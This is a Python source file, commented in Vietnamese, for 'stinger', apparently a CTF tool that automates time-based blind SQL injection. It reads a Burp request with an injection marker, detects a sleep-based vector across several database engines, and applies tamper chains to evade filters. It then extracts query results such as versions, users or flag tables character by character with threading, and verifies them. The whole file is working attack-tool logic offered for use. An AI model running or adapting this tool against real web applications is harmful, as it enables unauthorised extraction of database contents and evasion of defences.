#!/usr/bin/env python3
"""
stinger - inline time-based blind SQLi extractor cho lab CTF.

Ghép tất cả: parse Burp request -> đo/chốt vector (TRUE/FALSE) -> trích xuất -> verify.

Ví dụ (chạy từ thư mục root qua main.py):
    python main.py -r req.txt                          # mặc định: select version()
    python main.py -r req.txt --query "select content from final_flag limit 1"
    python main.py -r req.txt --dbms mysql --vector mysql-inline-sleep
    python main.py -r req.txt --tamper between,space2comment
    python main.py -r req.txt --dbms auto -v

Marker: chèn '*' vào vị trí inject trong file request (vd {"id":"*"}).
"""

from __future__ import annotations

import argparse
import sys
import time

from stinger.request import parse_request_file, RequestParseError
from stinger.transport import Transport, TransportError
from stinger.vectors import VectorStore, detect_vector, VectorError
from stinger.oracle import Oracle
from stinger.extract import extract, verify, repair, ExtractError
from stinger.tamper_engine import TamperChain, TamperError

# Khi không truyền --query, tool dùng query mặc định THEO DBMS đã chốt (version/database/
# user), lấy từ vectors.yaml. Không hardcode một câu vì mỗi DBMS có cú pháp riêng
# (MySQL version() vs MSSQL @@version vs Oracle v$version...).
DEFAULT_QUERY_KIND = "version"


def _build_measure(transport, tamper_chain, dbms_hint):
    """Bọc transport.measure thêm bước tamper (đúng THỨ TỰ DESIGN: tamper trước khi gửi).

    request.py đã lo Content-Length SAU khi payload (đã tamper) được chèn -> đúng thứ tự.
    """
    if not tamper_chain:
        return transport.measure

    def measure(payload):
        tampered = tamper_chain.apply(payload, dbms=dbms_hint)
        return transport.measure(tampered)

    return measure


def main(argv=None):
    p = argparse.ArgumentParser(
        prog="stinger",
        description="Inline time-based blind SQLi extractor (CTF).",
    )
    p.add_argument("-r", "--request", required=True,
                   help="file request (Burp), có marker '*' ở vị trí inject")
    p.add_argument("--query", default=None,
                   help="câu truy vấn cần trích xuất. Mặc định: query version() theo DBMS "
                        "đã chốt. Vd lấy flag: --query \"select content from final_flag limit 1\"")
    p.add_argument("--dump", default=DEFAULT_QUERY_KIND,
                   choices=("version", "database", "user", "hostname"),
                   help="khi không có --query, dump thông tin gì theo DBMS (mặc định version)")
    p.add_argument("--dbms", default="auto",
                   help="mysql|postgresql|mssql|oracle|auto (mặc định auto)")
    p.add_argument("--vector", default=None,
                   help="ép dùng một vector theo tên (bỏ qua bước dò)")
    p.add_argument("--mode", choices=("hex", "char"), default="hex",
                   help="chế độ trích xuất (mặc định hex - an toàn, bắt multibyte)")
    p.add_argument("--tamper", default=None,
                   help="danh sách tamper cách nhau dấu phẩy (vd between,space2comment)")
    p.add_argument("--delay", type=float, default=3.0,
                   help="số giây sleep (mặc định 3)")
    p.add_argument("--threads", type=int, default=10,
                   help="số vị trí ký tự đọc song song (mặc định 10, đặt 1 để tuần tự)")
    p.add_argument("--votes", type=int, default=1, choices=(1, 3),
                   help="3 = bỏ phiếu đa số (dùng khi mạng nhiễu)")
    p.add_argument("--pause", type=float, default=0.0,
                   help="nghỉ giữa các request (chống reset)")
    p.add_argument("--timeout", type=float, default=30.0)
    p.add_argument("--retries", type=int, default=4)
    p.add_argument("--maxlen", type=int, default=None)
    p.add_argument("--vectors-file", default=None,
                   help="đường dẫn vectors.yaml tùy chỉnh")
    p.add_argument("-v", "--verbose", action="store_true")
    a = p.parse_args(argv)

    def log(msg):
        print(msg)

    # 1) parse request
    try:
        base = parse_request_file(a.request)
    except (RequestParseError, OSError) as e:
        print("[!] lỗi đọc request: %s" % e)
        return 2
    if not base.has_marker():
        print("[!] request không có marker '*'. Chèn '*' vào vị trí inject "
              "(vd {\"id\":\"*\"}) rồi thử lại.")
        return 2

    print("[*] target : %s" % base.url())
    print("[*] method : %s" % base.method)
    print("[*] marker : %s" % base.marker_location())
    if a.query:
        print("[*] query  : %s" % a.query)
    else:
        print("[*] query  : (mặc định '%s' theo DBMS sẽ chốt)" % a.dump)

    # 2) tamper chain (nếu có)
    tamper_chain = None
    if a.tamper:
        names = [n.strip() for n in a.tamper.split(",") if n.strip()]
        try:
            tamper_chain = TamperChain.from_names(names)
        except TamperError as e:
            print("[!] lỗi tamper: %s" % e)
            return 2
        print("[*] tamper : %s" % " -> ".join(n for n, _ in tamper_chain.order()))

    # 3) transport
    try:
        transport = Transport(base, timeout=a.timeout, retries=a.retries, pause=a.pause)
    except TransportError as e:
        print("[!] %s" % e)
        return 2

    dbms_hint = None if a.dbms == "auto" else a.dbms
    measure = _build_measure(transport, tamper_chain, dbms_hint)

    # 4) đo & chốt vector
    try:
        store = VectorStore.load(a.vectors_file)
    except VectorError as e:
        print("[!] %s" % e)
        return 2

    print("\n[*] dò vector (xác nhận bằng TRUE/FALSE)...")
    try:
        detect = detect_vector(store, measure, sleeptime=a.delay,
                               dbms=a.dbms, forced_vector=a.vector, log=log)
    except VectorError as e:
        print("[!] %s" % e)
        return 3

    dialect = store.dialect(detect.vector.dbms)

    # 4c) Quyết query: nếu người dùng không truyền --query -> dùng query mặc định THEO
    # DBMS đã chốt (mỗi DBMS cú pháp riêng). Giờ mới biết DBMS nên resolve ở đây.
    query = a.query
    if not query:
        try:
            query = store.default_query(detect.vector.dbms, a.dump)
        except VectorError as e:
            print("[!] %s" % e)
            return 2
        print("[*] query mặc định (%s/%s): %s" % (detect.vector.dbms, a.dump, query))

    # 5) trích xuất
    oracle = Oracle(detect, measure, sleeptime=a.delay,
                    votes=a.votes, verbose=a.verbose, log=log)

    def progress(done, total, preview):
        print("\r[%3d/%s] %s" % (done, total, preview), end="", flush=True)

    print("\n[*] Trích xuất (chế độ %s, DBMS %s)...\n" % (a.mode, detect.vector.dbms))
    t0 = time.time()
    try:
        data, meta = extract(oracle, query, dialect, mode=a.mode,
                             maxlen=a.maxlen, threads=a.threads,
                             progress=progress, log=log)
    except ExtractError as e:
        print("\n[!] %s" % e)
        return 3
    print()

    # 6) verify. Nếu đọc đa luồng và verify KHÔNG khớp -> pha kiểm chứng 1 luồng:
    #    verify từng byte + đọc lại byte sai (chính xác, không nhiễu vì tuần tự).
    ok = False
    try:
        ok = verify(oracle, query, dialect, data)
    except Exception:
        pass

    if not ok and a.threads > 1 and a.mode == "hex":
        print("\n[*] verify KHÔNG KHỚP - kiểm chứng & sửa từng byte bằng 1 luồng...")
        try:
            data = repair(oracle, query, dialect, data, log=log)
            ok = verify(oracle, query, dialect, data)
            meta["char_len"] = len(data.decode("utf-8", "replace"))
        except Exception as e:
            print("[!] lỗi khi sửa: %s" % e)

    # 7) kết quả
    print("\n" + "=" * 60)
    print("raw bytes :", data)
    print("hex       :", data.hex())
    print("utf-8     :", data.decode("utf-8", "replace"))
    print("độ dài    : %d byte / %s ký tự" % (len(data), meta.get("char_len")))
    print("vector    : %s/%s" % (detect.vector.dbms, detect.vector.name))
    print("verify    : %s" % ("KHỚP" if ok else "KHÔNG KHỚP (!)"))
    print("chi phí   : %d request, %.0fs" % (transport.n_req, time.time() - t0))
    print("=" * 60)
    if not ok and a.threads > 1:
        print("[!] verify KHÔNG KHỚP - có thể do nhiễu khi chạy %d luồng.\n"
              "    Thử lại với --threads nhỏ hơn (vd 3-5) hoặc tăng --delay."
              % a.threads)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
